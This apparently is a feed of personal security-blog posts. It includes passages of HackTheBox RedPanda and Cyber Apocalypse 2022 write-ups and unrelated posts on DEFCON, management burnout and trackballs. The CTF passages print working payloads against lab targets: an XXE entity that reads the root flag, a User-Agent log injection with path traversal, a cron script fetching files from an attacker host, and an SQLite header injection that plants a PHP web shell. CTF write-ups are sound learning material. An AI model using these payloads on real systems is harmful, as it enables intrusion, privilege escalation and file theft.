root         879  0.0  0.2   9420  4576 ?        S    Jul30   0:00 sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
</code></pre><p>Yep</p>
<pre><code>root         860  0.0  0.1   6812  3008 ?        Ss   Jul30   0:00 /usr/sbin/cron -f
root         863  0.0  0.1   8356  3404 ?        S    Jul30   0:00  \_ /usr/sbin/CRON -f
root         878  0.0  0.0   2608   536 ?        Ss   Jul30   0:00      \_ /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         879  0.0  0.2   9420  4576 ?        S    Jul30   0:00          \_ sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
woodenk      884 10.2 30.7 3140528 623772 ?      Sl   Jul30  10:10              \_ java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
</code></pre><p>We can&rsquo;t write to <code>root</code>&rsquo;s <code>crontab</code>, nor do we have permissions to modify the jar file noted above. One thing that will be useful for us shortly is that the uncompiled Java code for all of the applications in use for the challenge is available on the box. While it&rsquo;s certainly possible to decompile the running <code>jar</code>s (and needing to do so would have been an evil twist&hellip;), we have everything we need for some whitebox analysis at this point.</p>
<p>There&rsquo;s a <code>cleanup.sh</code> in <code>/opt/</code> that uses find and executes an rm against what it finds. Maybe there&rsquo;s a way to exploit this with a fishy filename? Come back to this, not an obvious path.</p>
<p>We have some hardcoded creds for MySQL in the source for the app under <code>/opt/panda_search/src/</code>:</p>
<pre><code>conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/red_panda&quot;, &quot;woodenk&quot;, &quot;RedPandazRule&quot;);
</code></pre><p>Note: This is the user password for the OS as well, so we can use it for SSH!</p>
<p>Creds are valid, but the data is useless to us - it&rsquo;s the same stuff we saw about pandas in a browser&hellip; but&hellip; could we add a panda and have the image be the flag? Probably not, but let&rsquo;s try&hellip; The insert works and we can see it in the portal, but the path doesn&rsquo;t resolve as it just comes relative to the website and is passed in verbatim. MySQL is also smart and locks us in as the same user - woodenk - so no priv esc here.</p>
<h1 id="i-pspy-with-my-little-eye">I <code>pspy</code> with my little eye</h1>
<pre><code>2022/07/31 15:06:01 CMD: UID=0    PID=1443   | /usr/sbin/CRON -f 
2022/07/31 15:06:01 CMD: UID=0    PID=1444   | /bin/sh -c /root/run_credits.sh 
2022/07/31 15:06:01 CMD: UID=0    PID=1446   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
2022/07/31 15:06:01 CMD: UID=0    PID=1445   | /bin/sh /root/run_credits.sh 
...
2022/07/31 15:10:01 CMD: UID=0    PID=1601   | /bin/sh /root/run_credits.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1600   | /bin/sh -c /root/run_credits.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1604   | /bin/sh /root/run_credits.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1603   | sudo -u woodenk /opt/cleanup.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1602   | /bin/sh -c sudo -u woodenk /opt/cleanup.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1605   | /usr/bin/systemd-tmpfiles --clean 
2022/07/31 15:10:01 CMD: UID=1000 PID=1621   | /usr/bin/find /tmp -name *.xml -exec rm -rf {} ; 
2022/07/31 15:10:01 CMD: UID=0    PID=1620   | /lib/systemd/systemd-udevd 
2022/07/31 15:10:01 CMD: UID=1000 PID=1619   | /bin/bash /opt/cleanup.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1622   | /lib/systemd/systemd-udevd 
2022/07/31 15:10:01 CMD: UID=1000 PID=1625   | /bin/bash /opt/cleanup.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1633   | /lib/systemd/systemd-udevd 
2022/07/31 15:10:01 CMD: UID=1000 PID=1635   | /usr/bin/find /var/tmp -name *.jpg -exec rm -rf {} ; 
2022/07/31 15:10:01 CMD: UID=1000 PID=1636   | /usr/bin/find /dev/shm -name *.jpg -exec rm -rf {} ; 
2022/07/31 15:10:01 CMD: UID=1000 PID=1637   | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ; 

</code></pre><p>Maybe we could do something with this? I doubt we can read the file, but worth a try in a bit. Looks like this may run every 2 minutes&hellip; Worst case we should be able to review what LogParser does.</p>
<p>Confirming we can&rsquo;t read the stuff from root&rsquo;s dir, but let&rsquo;s see what logparser does. AFAICT this is the overall flow:</p>
<ul>
<li>Open the log file at <code>/opt/panda_search/redpanda.log</code></li>
<li>Parse the log looking for <em>A LINE</em> (the whole line) that conatins <code>.jpg</code></li>
<li>If the line contains a <code>.jpg</code> reference, parse with the following logic:</li>
</ul>
<pre><code>    public static Map parseLog(String line) {
        String[] strings = line.split(&quot;\\|\\|&quot;);
        Map map = new HashMap&lt;&gt;();
        map.put(&quot;status_code&quot;, Integer.parseInt(strings[0]));
        map.put(&quot;ip&quot;, strings[1]);
        map.put(&quot;user_agent&quot;, strings[2]);
        map.put(&quot;uri&quot;, strings[3]);
        

        return map;
    }
</code></pre><ul>
<li>Get the artist metadata:</li>
</ul>
<pre><code>            System.out.println(parsed_data.get(&quot;uri&quot;));
            String artist = getArtist(parsed_data.get(&quot;uri&quot;).toString());
</code></pre><pre><code>    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = &quot;/opt/panda_search/src/main/resources/static&quot; + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == &quot;Artist&quot;)
                {
                    return tag.getDescription();
                }
            }
        }

        return &quot;N/A&quot;;
    }
</code></pre><p>Note: Can we put our payload in the image metadata? ð¤</p>
<ul>
<li>Dump the output to an XML file:</li>
</ul>
<pre><code>            System.out.println(&quot;Artist: &quot; + artist);
            String xmlPath = &quot;/credits/&quot; + artist + &quot;_creds.xml&quot;;
            addViewTo(xmlPath, parsed_data.get(&quot;uri&quot;).toString());
</code></pre><p>Current line of thinking is that we might be able to abuse the Artist jpg metdata to create a bogus path and write out our root flag since this process should have access to it. We&rsquo;re no longer limited by the database varchar size limit on the artist name, which should come in handy.</p>
<p>Our URI <em>does</em> need to be a jpg file, but with how this is formed (a filesystem path) we might be able to store this in a location we control. So the overall steps might be something like:</p>
<ul>
<li>Create an image with malicious Artist metadata</li>
<li>Send a request to that image through a forged database entry that associates it with a panda</li>
<li>This then writes out a log file in /credits/ with a name we control&hellip;</li>
<li>Can we then abuse <code>find</code> to run this? Hmmm&hellip;</li>
</ul>
<p>Reading through some XXE notes, we may be able to leverage a new entity in the file we control to inject a filepath for it to return in the output, in a field we arbitrarily name.</p>
<p>Since we know this is writing to a file location that we can control, and we know that when that file is then read by the other process it must have an author of <code>woodenk</code> or <code>damian</code>&hellip;</p>
<pre><code>      System.out.println(&quot;Exporting xml of: &quot; + author);
      if(author.equals(&quot;woodenk&quot;) || author.equals(&quot;damian&quot;))
      {
          InputStream in = new FileInputStream(&quot;/credits/&quot; + author + &quot;_creds.xml&quot;);
          System.out.println(in);
          return IOUtils.toByteArray(in);
      }
      else
      {
          return IOUtils.toByteArray(&quot;Error, incorrect paramenter 'author'\n\r&quot;);
      }
  }
</code></pre><h1 id="wwf-wwe-wcw-nah-xxe">WWF? WWE? WCW? Nah&hellip; XXE!</h1>
<p>Can we do something like this?</p>
<ul>
<li>Get an arbitrary image</li>
<li>Update it with exiftool <code>exiftool -Artist=&quot;../home/woodenk/pwn' &lt;image&gt;.jpg</code>
<ul>
<li>Note that we need the .. here as it&rsquo;s going to resolve relative to <code>/credits/</code> as seen earlier</li>
</ul>
</li>
<li>Upload that file to <code>/home/woodenk</code></li>
<li>Create our XXE injection with something based on the actual XML output&hellip;</li>
</ul>
<pre><code>&lt;!--?xml version=&quot;1.0&quot; ?--&gt;
&lt;!DOCTYPE replace [&lt;!ENTITY injection SYSTEM &quot;file:///root/root.txt&quot;&gt; ]&gt;
&lt;credits&gt;
&lt;author&gt;woodenk&lt;/author&gt;
&lt;image&gt;
&lt;uri&gt;/../../../../../../../../home/woodenk/panda.jpg&lt;/uri&gt;
&lt;pwn&gt;&amp;injection;&lt;/pwn&gt;
&lt;views&gt;1&lt;/views&gt;
&lt;/image&gt;
&lt;/credits&gt;
</code></pre><ul>
<li>Save this file to <code>/home/woodenk/pwn_creds.xml</code> so that we can request it when the artist is evaluated and we get our path
<ul>
<li>Note, this way it&rsquo;s going to be used by <code>addViewTo</code> in the log parser&hellip;</li>
</ul>
</li>
<li>Since we&rsquo;re associating this with another author (woodenk for example) we may get the injection output in that export? Somehow?</li>
</ul>
<p>But how will we request this image in the first place? Can we use SQLi to point a URI to it?</p>
<p>Also note that both this image and the xml file are going to get deleted, often, so we need to figure out some persistence. I&rsquo;m thinking a cron job that&rsquo;ll run a <em>script</em> out of /dev/shm that&rsquo;ll download these from my host every minute and dump into /home/woodenk</p>
<p>Placed this script in /dev/shm/foo.sh, and set up cron job to run every minute</p>
<pre><code>remote=&quot;10.10.14.10:8000&quot;
curl http://$remote/panda.jpg -o /home/woodenk/panda.jpg
curl http://$remote/pwn_creds.xml -o /home/woodenk/pwn_creds.xml
</code></pre><pre><code>remote=&quot;10.10.14.10:8000&quot;
curl http://$remote/panda.jpg -o /home/woodenk/panda.jpg
curl http://$remote/pwn_creds.xml -o /home/woodenk/pwn_creds.xml
</code></pre><p>Now we sit back and wait to see if it works&hellip; Yep, this works for persistence, now let&rsquo;s figure out how to request this damn file in the first place&hellip;</p>
<p>As far as I can tell, we need to send a request but we can&rsquo;t hit that URI&hellip;</p>
<p>Fortunately the log parsing is &ldquo;dumb&rdquo; and is looking at positional locations based on a delimieter we know&hellip; <code>||</code> as seen in <code>App.java</code>:</p>
<pre><code>    public static Map parseLog(String line) {
        String[] strings = line.split(&quot;\\|\\|&quot;);
        Map map = new HashMap&lt;&gt;();
        map.put(&quot;status_code&quot;, Integer.parseInt(strings[0]));
        map.put(&quot;ip&quot;, strings[1]);
        map.put(&quot;user_agent&quot;, strings[2]);
        map.put(&quot;uri&quot;, strings[3]);
        

        return map;
    }
</code></pre><p>Can we override the user agent and just send <em>any</em> request?</p>
<p><code>curl http://10.129.73.208:8080/ -H &quot;User-Agent: ||/../../../../../../../../home/woodenk/panda.jpg&quot;</code></p>
<p>Let&rsquo;s spam this and see what happens&hellip; Also going to back off cron job to every 5 min so I don&rsquo;t clobber my own output. No luck yet. Time for a break and come back fresh.</p>
<p>I just needed to be patient :) Approach above works! Had to wait for background jobs to all run on cron. That lag I noted earlier about the export info being updated is real and almost threw me off course here.</p>
<p>GG!</p>
]]></content></item><item><title>DEFCON 30 - Homecoming</title><link>https://www.maclaren.dev/posts/2022-08/defcon30/</link><pubDate>Sat, 20 Aug 2022 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2022-08/defcon30/</guid><description>At last, DEFCON&amp;hellip; I&amp;rsquo;ve wanted to go to DEFCON since I first heard about it almost 20 years ago, and finally the stars aligned and it was a possibility this year. Spoilers, it didn&amp;rsquo;t disappoint.
While DEFCON is no longer the insane party that you may have heard of in the past, it&amp;rsquo;s none the less three-ish days of discovery and debauchery. Everything from super in-depth talks, to scavenger hunterse, to impromptu analog synth parties in the back end of the venue last at night after most folks have gone to bed.</description><content type="html"><![CDATA[<h1 id="at-last-defcon">At last, DEFCON&hellip;</h1>
<p>I&rsquo;ve wanted to go to DEFCON since I first heard about it almost 20 years ago, and finally the stars aligned and it was a possibility this year. Spoilers, it didn&rsquo;t disappoint.</p>
<p>While DEFCON is no longer the insane party that you may have heard of in the past, it&rsquo;s none the less three-ish days of discovery and debauchery. Everything from super in-depth talks, to scavenger hunterse, to impromptu analog synth parties in the back end of the venue last at night after most folks have gone to bed. The vibe was real.</p>
<h1 id="what-did-i-get-up-to">What did I get up to?</h1>
<p>This was a work trip for me, so I ended up spending a fair bit of my time catching relevant <em>unrecorded</em> talks since the content was excellent. This meant spending a lot of time in the RECON village chatting with folks who do OSINT work as a <em>lot</em> of this leads to discovery for vulnerabilities in my current line of work. As part of the Scav Hunt I also learned how to make a Doom map and created a Stego Stegasaurus. Beyond that, I participated in the scav hunt with a team of other friends and had a blast, though we didn&rsquo;t get the black badge&hellip; maybe next year!</p>
<p>I also had a chance to go to several parties (as a legitimate guest, no less)!</p>
<p>I started the week off with HackerOne&rsquo;s party at Mandalay Bay&rsquo;s EyeCandy. It was&hellip; an experience. As far as Las Vegas is concerned, COVID is just no longer a thing. We were packed in like sardines - standing room only - and the music was so loud that you had to scream in someone&rsquo;s face for them to be able to hear you. It was nice to see something closer to &ldquo;normal&rdquo; again, but it was definitely uncomfortable. We ditched after a while and found a nice quiet-by-Vegas-stanards bar to socialize at. The next night we went out to a party that Microsoft hosted at Area 15 and it was an absolute <em>blast</em>. MSFT had rented out the Illuminarium, which was done up floor to ceiling (including the floors and ceilings) to be like the surface of the moon. They had challenges hidden around for prizes, great drinks, great food, and I had a chance to meet some folks in industry that I&rsquo;ve been following for ages (Marcus Hutchins, Jason Haddix, InsiderPHD, and others). It was fantastic.</p>
<h1 id="the-defcon-first-timers-trap">The DEFCON first timer&rsquo;s trap</h1>
<p>I did, however, fall into the trap that many first time attendees fall into, which is trying to do too much. Three days is nowhere near enough time to do everything you&rsquo;ll want to do at DEFCON. Lesson learned - next year is going to be much more focused. Scav Hunt, and time spent around 2-3 villages&hellip; and ideally ones in close proximity. Having to hike from Caeser&rsquo;s Forum over to App Sec Village in the Flamingo was nearly a <em>thirty minute walk</em> when accounting for foot traffic. The scale of the event is just plain crazy.</p>
<p>I probably lost out on almost a full day of time just between waiting in lines for the Merch hall and walking between buildings. It&rsquo;s definitely important to find a focus and stick with it, at least during the hours the villages are open.</p>
<h1 id="whats-the-plan-for-next-year">What&rsquo;s the plan for next year?</h1>
<p>A few tangential learnings, and certainly some of which are tied to being a bit older and being reasonably well traveled:</p>
<ul>
<li>Staying at casinos still sucks. The rooms are not amazing, and the prices are absurd. The Westin is the same walking distance to the event as Bally&rsquo;s, but is considerably nicer and quieter.</li>
<li>The Las Vegas monorail considerably expands your hotel options, though keeps you somewhat limited to casinos. None the less, a 10 minute ride on the monorail is worth it to stay somewhere much nicer.</li>
<li>Go shopping for Scav Hunt items <em>immediately</em>. We waited until Saturday to do so, and definitely missed the boat not only on points (due to decay), but on time.</li>
<li>Go to the DEFCON parties! I had expected some of them to be reasonably &ldquo;meh&rdquo;, but the DJs were great, and the Chillout hall/community parties (QueerCon/GothCon) were bumpin'.</li>
<li>Talk to more people. Everyone has something cool they&rsquo;re working on, wants to learn about, or wants to teach. It&rsquo;s the only place I&rsquo;ve ever been where walking up to strangers is almost always a rewarding experience.</li>
</ul>
<p>And lastly&hellip; book travel and hotel more than 3 weeks in advance, even if it&rsquo;s on my own dime.</p>
<h1 id="and-in-closing">And in closing&hellip;</h1>
<p>Don&rsquo;t think about going to DEFCON. If you&rsquo;ve watched a talk, or heard about a village, and it sounds even remotely interesting - <strong>GO TO DEFCON</strong>.</p>
]]></content></item><item><title>Management, burnout, and upcoming changes</title><link>https://www.maclaren.dev/posts/2022-06/changes/</link><pubDate>Sun, 19 Jun 2022 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2022-06/changes/</guid><description>Management I got into management about a year ago, and it has been one hell of a ride. There&amp;rsquo;s sort of a running joke that &amp;ldquo;management isn&amp;rsquo;t for everyone&amp;rdquo;, and I can certainly verify that.
I had moved into management with the hopes of it being a great way to advance my career further, push me closer to the goal of getting a Director position, and hopefully scratching the same problem solving itch that solving technical problems and helping organize my team as a lead did.</description><content type="html"><![CDATA[<h1 id="management">Management</h1>
<p>I got into management about a year ago, and it has been one hell of a ride. There&rsquo;s sort of a running joke that &ldquo;management isn&rsquo;t for everyone&rdquo;, and I can certainly verify that.</p>
<p>I had moved into management with the hopes of it being a great way to advance my career further, push me closer to the goal of getting a Director position, and hopefully scratching the same problem solving itch that solving technical problems and helping organize my team as a lead did.</p>
<p>To start off with the (possibly obvious) point from the list above - it does <em>not</em> scratch that same itch. Not even close. While handling logistical/people problems is indeed interesting and engaging, the politics that come with it are exhausting and not at all in an intriguing way.</p>
<p>Maybe this has to do with changes as the company scales, but the overall concept of analyzing everything down to the most minute detail before implementation is downright exhausting. Add to that conflicting points of view, many of which are often <em>objectively</em> wrong, and you get a recipe for extremely slow movement and low return on investment for projects undertaken. I suspect this is the same at most companies, to be clear, but it was far more drastic than I had anticipated going in.</p>
<p>Insofar as career growth - it&rsquo;s a very slow move from senior manager to Director, especially considering that you&rsquo;re likely needing significant organization growth to ever facilitate it, or a Director leaving and you being the next most likely person to take the job. The other thing that comes with this, though, that I had not appreciated in advance is that the politics and disconnect from the actual jobs being done increase somewhat exponentially as you move up the ladder. It&rsquo;s no longer surprising to me that executives know next to nothing about day to day operations. Still depressing&hellip; just not surprising.</p>
<p>Moving into management was absolutely a valuable experience, however, and I&rsquo;d suggest folks who are curious do it at least once to see if it sticks. I don&rsquo;t think I&rsquo;d be interested in doing it again though, at least not with the team sizes here. For reference, I&rsquo;ve got 13 engineers as direct reports, I could see a team of ~5 being quite enjoyable.</p>
<p>Despite all this, I&rsquo;ve gotten a hell of a lot done over the past year. I&rsquo;ve helped <em>double</em> the size of the organization, I&rsquo;ve found ways to continue to increase revenue while decreasing workload, I&rsquo;ve promoted several folks and helped others move on to their dream jobs, and I&rsquo;ve helped bring visibility to several areas that need significant long-term attention. It has been productive, and seeing the outcomes is very rewarding, but I can&rsquo;t help but feel that I could have done a lot of this from an IC role as well.</p>
<p><em>Leadership != Management</em></p>
<h1 id="burnout">Burnout</h1>
<p>This, I think, is a case of right place wrong/wrong time. The organization I&rsquo;m a part of has primarily hired managers externally over the past few years (both for backfill and growth), and as a result of this we <em>excellent</em> people managers, but most have little/no knowledge of our tech stack, or any interest in learning it.</p>
<p>Unfortunately for me, I&rsquo;m still super interested in it, and this has meant that I still have a tremendous amount of responsibility when dealing with technical escalations or complex problems. I&rsquo;ve effectively been doing the role of &ldquo;L3&rdquo; Support, escalation management, and people management. This would be fine if the other managers were also in this boat as it could be load balanced, but it hasn&rsquo;t been the case.</p>
<p>I did go into this expecting 50 hour weeks to be the norm, and honestly it has been pretty well aligned with that. There&rsquo;s the usual ebb and flow - some weeks are closer to 40, some weeks are closer to 60, but the average is probably in that 50 range. Again, another thing I had known but didn&rsquo;t really appreciate, is that virtually every one of those hours is going to be spent in meetings&hellip; and most of those meetings could have been done async or could have not happened at all with little to not loss in effectiveness.</p>
<p>For clarity, I highly value the 1on1 meetings I have with my team members. While I probably should have been scheduling those bi-weekly instead of weekly, the value is there either way. My challenge here was mostly around working in a company that is globally distributed, has a majority of its organizations working in a highly async fashion, but being part of an organization that (through growth and a focus on external hiring from non-&ldquo;async&rdquo; companies) has almost completely lost the ability to work asynchronously.</p>
<p>Whether this is good, or bad, I don&rsquo;t know and I&rsquo;m not going to comment. I just know that I don&rsquo;t enjoy it.</p>
<p>In any case, this has lead to a level of burnout I haven&rsquo;t experienced since routinely pulling 70+ hour weeks in the startup world as a single point of failure for nearly all customer operations at a previous job. I needed a change.</p>
<h1 id="changes">Changes</h1>
<p>I first realized that I really was not enjoying my job, or interested in pursuing that career path, back around Christmas time. I started entertaining some interviews, and in several of them I actually got some great insight from folks who had taken a similar path that maybe I should reconsider what I was doing. Most interestingly, this often came <em>after</em> job offers for management positions, so it was at the cost of them losing a candidate they wanted. I deeply appreciate that level of honesty, and it won&rsquo;t be forgotten.</p>
<p>At this point I think it&rsquo;s important to note how incredibly supportive my management chain was in helping me find something that was a better fit, whether in the company or outside of it. I knew I wanted to move back into an individual contributor role, but I wasn&rsquo;t sure if it was going to be in the Support world, engineering, or something else (e.g. SRE, Solutions Engineering, etc&hellip;).</p>
<p>I had an opoprtunity to do a part-time internship with one of our engineering teams for a period of 3 months, and that was extremely valuable. It showed me that I do probably have more knowledge in that space than I thought, and it really allowed me to learn more about my unknown unknowns&hellip; one of which is that having a position where a majority of your time is spent working on top of/fixing someone else&rsquo;s code has a lot of the same frustrations as what I had been doing previously in Support. Combine it with an area of our tech stack that I don&rsquo;t have a lot of love for, and I decided maybe that wasn&rsquo;t the path for me despite being an awesome opportunity. Maybe I&rsquo;ll swing back in that direction though? Time will tell&hellip;</p>
<h1 id="turn-a-passion-into-a-job">Turn a passion into a job?</h1>
<p>After quite a saga of hunting and experimenting over the past 6 months, I finally found something that I think will be an awesome way to spend a few years. It does have some risks, in that it is turning a life-long passion into a job, but it&rsquo;s also one that I think will keep me engaged long term.</p>
<p>In July I&rsquo;ll be moving (back) into the cybersecurity world!</p>
<p>Without going into details (you can lurk my LinkedIn for that), I think this new position will combine my hobbies with my existing work-related skills, for a pretty fantastic mix of entertaining and productive work.</p>
<p>More to come on this topic as time goes on!</p>
]]></content></item><item><title>Ploopy Classic &amp; Nano Trackballs</title><link>https://www.maclaren.dev/posts/2022-06/ploopy/</link><pubDate>Sun, 19 Jun 2022 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2022-06/ploopy/</guid><description>That&amp;rsquo;s a silly name Yes.
What are they? Ploopy is a company that designs and produces open-source trackballs and mice.
Having been a Trackball enthusiast for a while, and not being able to find one that I really liked, I figured I&amp;rsquo;d give this a shot. One of my gripes in general has been that most of the trackballs out there are either great functionall but have shitty ergnomics, or have great ergonomics and awful functionality/drivers.</description><content type="html"><![CDATA[<h1 id="thats-a-silly-name">That&rsquo;s a silly name</h1>
<p>Yes.</p>
<h1 id="what-are-they">What are they?</h1>
<p><a href="https://ploopy.co">Ploopy</a> is a company that designs and produces open-source trackballs and mice.</p>
<p>Having been a Trackball enthusiast for a while, and not being able to find one that I really liked, I figured I&rsquo;d give this a shot. One of my gripes in general has been that most of the trackballs out there are either great functionall but have shitty ergnomics, or have great ergonomics and awful functionality/drivers. Most recently prior to this I had a Kensington Expert which I used for about a year. It was fine, but the ergonomics were awful and it gave me more wrist pain that it saved me.</p>
<p>With Ploopy everything, including the circuit board design, is both open-source and user-serviceable. If something breaks, just 3d print a new part or pop in a new Snooker ball. If something could be improved, just update the design and print a better version. This speaks to me.</p>
<h1 id="so-how-are-they">So how are they?</h1>
<p>You&rsquo;re paying a pretty significant margin for the cool/niche factor it seems. If you buy the kit, you&rsquo;re getting raw 3d prints, where you need to remove the structural bits, do your own soldering, etc&hellip; which is all fine (and reasonably fun).</p>
<p>The sensors for these trackballs are <em>outstanding</em>. Almost too good, in fact. Very difficult to track very minor movements, but Mac OS mouse acceleration helps out significantly. Challenging on Windows, TBD on Linux.</p>
<p>Roller bearings are loud, as advertised, but <em>super</em> smooth compared to any static bearing trackballs you may have used in the past.</p>
<p>As they&rsquo;re 3D printed, the weight is very low. With the feet on them, however, no issues with movement on my desks, at least not on the desk mats I have. You could always add some more bulk to the inside of the case if you wanted.</p>
<p>Buttons/switches feel good, though getting them angled just the way you want can be tricky. N/A on the Nano as it has no buttons.</p>
<p>Balls being standard sizes are also a plus after coming from the Kensington Expert.</p>
<p>The scroll wheel is&hellip; bad. It can&rsquo;t handle extremely fast scrolling (i.e. turning it quickly) and it&rsquo;s <em>smooth</em> so there&rsquo;s little feedback with it. That said, after lubricating it with some GPL205 it&rsquo;s reasonably pleasant to use, but it&rsquo;s still by far the weakest point of the trackball (something well understood by the designer).</p>
<h1 id="tldr">TL;DR</h1>
<p>Pros:</p>
<ul>
<li>Super cool, homegrown product</li>
<li>100% open source and user repairable</li>
<li>The sensor is <em>fantastic</em></li>
<li>Probably one of the best trackballs that I&rsquo;ve come across</li>
</ul>
<p>Cons:</p>
<ul>
<li>You&rsquo;re paying a <em>lot</em> of money for something that costs likely &lt; $10 to produce, and dealing with some of the jank that comes with 3d printed parts while doing so.</li>
<li>Scroll wheel is a resounding &ldquo;meh&rdquo; and will likely require regular re-lubrication to remain usable at all.</li>
<li>Flashing new firmware is&hellip; let&rsquo;s just say it&rsquo;s not really a thing that&rsquo;s feasible to do and leave it at that.</li>
</ul>
<h1 id="final-score">Final score</h1>
<p>3.5 / 5 balls, would click again.</p>
<p>Recommended for enthusiasts or open source fans, but not for someone expecting a super refined product. Despite that score, still probably the best overall package I&rsquo;ve found for a trackball so far.</p>
]]></content></item><item><title>HackTheBox - Cyber Apocalypse 2022</title><link>https://www.maclaren.dev/posts/2022-05/htb_cyber_apolcalypse/</link><pubDate>Tue, 24 May 2022 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2022-05/htb_cyber_apolcalypse/</guid><description>Well, that was harder than expected Many times in life it&amp;rsquo;s great to have a humbling experience. Not that I had an ego in this space anyway, I&amp;rsquo;m super new to it, but I was going in expecting to be able to crank through a fair number of challenges for this event. Let&amp;rsquo;s just say that didn&amp;rsquo;t happen.
Cyber Apocalypse 2022 was a jeopardy style CTF event with categories across all of the usual HackTheBox challenge content.</description><content type="html"><![CDATA[<h1 id="well-that-was-harder-than-expected">Well, that was harder than expected</h1>
<p>Many times in life it&rsquo;s great to have a humbling experience. Not that I had an ego in this space anyway, I&rsquo;m super new to it, but I was going in expecting to be able to crank through a fair number of challenges for this event. Let&rsquo;s just say that didn&rsquo;t happen.</p>
<p>Cyber Apocalypse 2022 was a jeopardy style CTF event with categories across all of the usual HackTheBox challenge content. I decided to primarily focus on Web as I&rsquo;ve got the most experience there, but also dabbled in a few others.</p>
<p>I also had some split brain going into this as another CTF event was taking place at exactly the same time, though was quite easier. None the less, between work, that event, and this one I had some serious split brain going on.</p>
<h1 id="the-challenges">The Challenges</h1>
<p>Unforutunately I can&rsquo;t track down the names of any of the challenges, so I&rsquo;ll need to work from memory here. From what I recall, I complete two of the <code>web</code> challenges, two of the <code>pwn</code> challenges, and one of the <code>misc</code> challenges.</p>
<p>The first <code>pwn</code> challenge, honestly, I think was broken. I was able to solve it by inputting random text of any length. I <em>think</em> it was meant to be a buffer overflow that required a specific length string, but something definitely went wrong. The second challenge was a matter of finding the flag in the compiled code, obfuscated and pulling apart the executable in Ghidra was sufficient to expose the flag. I suspect there would be other, more graceful/efficient, approaches for that challenge since it was just a matter of the flag not being UTF-8 encoded, but it worked!</p>
<p>The <code>misc</code> challenge was an interface that would accept file creation, and then compress those files. It didn&rsquo;t sanitize user-provided filenames, so it was possible to do LFI and pull in the flag quite directly (e.g. <code>Enter filename: ../../../../../../flag.txt</code>). Again, a bit of a freebie.</p>
<p>The <code>web</code> challenges were a touch more involved, and were quite fun, though obviously on the easier end. The first one I recall was a whitebox challenge, and was based around a website that would sign you up for a newsletter. While the email addresses were sanitized, and parameterized in queries, the website would also track the visitor IP and log that&hellip; unsanitized. Part of this logic also allowed for the use of <code>X-Forwarded-For</code> headers, and when paired with an unsanitized query and a <code>sqlite</code> database on the backend you get&hellip; <em>drumroll</em> free web shells:</p>
<pre><code>X-Forwarded-For: honk', 'fart'); ATTACH DATABASE '/var/www/cmd.php' AS shell; CREATE TABLE shell.payload (payload text); INSERT INTO shell.payload VALUES('&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' ); -- 
</code></pre><p>The other challenge was a Markdown to PDF converter, and similarly was a whitebox challenge. This one was predicated around <a href="https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880">a known vulnerability in <code>mdToPdf</code></a>, so once that vulnerability/component was identified the remainder of the challenge was trivialized.</p>
<h1 id="final-standings">Final standings</h1>
<p>Our team finished 919th out of 7024 teams (top 15%). For a first real competitive team event, with areas that several of us have <em>no</em> expertise in (Hardware, Windows forensics, etc&hellip;) it was a great &ldquo;learning experience&rdquo;.</p>
<p>We&rsquo;re also going to be participating in the DefCon CTF qualifiers at the end of May, and our goals there are very &ldquo;realistic&rdquo;. Solving even a handful of challenges will be a win in our eyes&hellip;</p>
<h1 id="that-other-ctf">That other CTF?</h1>
<p>The other CTF event was a follow up to the Microsoft-hosted event I wrote about last month. This one was quite similar, but new website, new vulnerabilities, and new bonuses. I finished 2nd out of 137 active participants, which shows quite the contrast in complexity between thoese events and ones like HackTheBox!</p>
]]></content></item><item><title>Microsoft Strike CTF 2022 - Contoso Financial</title><link>https://www.maclaren.dev/posts/2022-04/msft_contoso_strike/</link><pubDate>Tue, 19 Apr 2022 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2022-04/msft_contoso_strike/</guid><description>Premise Microsoft runs an internal CTF event every so often called Strike CTF. While we&amp;rsquo;ve been asked not to share specifics around the challenges involved, I wanted to do a brief write-up, as it&amp;rsquo;s certainly a unique one that catered to multiple skill levels and had an educational twist.
For anyone interested in doing some digging, the version Microsoft runs has also been seen in some B-Sides events (and other conferences) under the name ShadowBank.</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
<p>Microsoft runs an internal CTF event every so often called <code>Strike CTF</code>. While we&rsquo;ve been asked not to share specifics around the challenges involved, I wanted to do a brief write-up, as it&rsquo;s certainly a unique one that catered to multiple skill levels and had an educational twist.</p>
<p>For anyone interested in doing some digging, the version Microsoft runs has also been seen in some B-Sides events (and other conferences) under the name <code>ShadowBank</code>.</p>
<h1 id="event-format">Event format</h1>
<p>Unlike a more typical CTF, this event didn&rsquo;t just have a few &ldquo;flags&rdquo; to find - it had <em>fifty three</em> and an indeterminate amount of <em>bonus</em> flags.</p>
<p>Players were presented with a web application noted as being vulnerable (and oh boy was it&hellip;), and were instructed to find ways to identify and exploit many of the <a href="https://owasp.org/Top10/">OWASP Top 10</a>. Uniquely, this application would also <em>automatically detect and award</em> exploitation, which made it very cool for beginners who wanted to poke around and try things.</p>
<p>The 50 <em>main</em> challenges were focused around:</p>
<ul>
<li>Reflected XSS</li>
<li>SQL injection</li>
<li>Cracking hashed passwords</li>
